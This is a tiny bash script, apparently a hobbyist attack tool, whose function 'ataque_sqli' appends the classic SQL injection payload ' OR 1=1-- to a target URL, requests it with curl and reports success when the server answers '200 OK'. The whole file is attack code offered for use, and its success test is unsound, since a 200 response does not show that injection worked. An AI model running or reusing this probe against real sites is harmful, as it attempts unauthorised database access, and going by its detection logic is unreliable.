#!/bin/bash
function ataque_sqli() {
declare -a myURL
URL=$(echo -e "$url")
SQLi="%27+OR+1=1--"
ATTACK="$URL$SQLi"
curl -i $ATTACK | grep "200 OK"
}
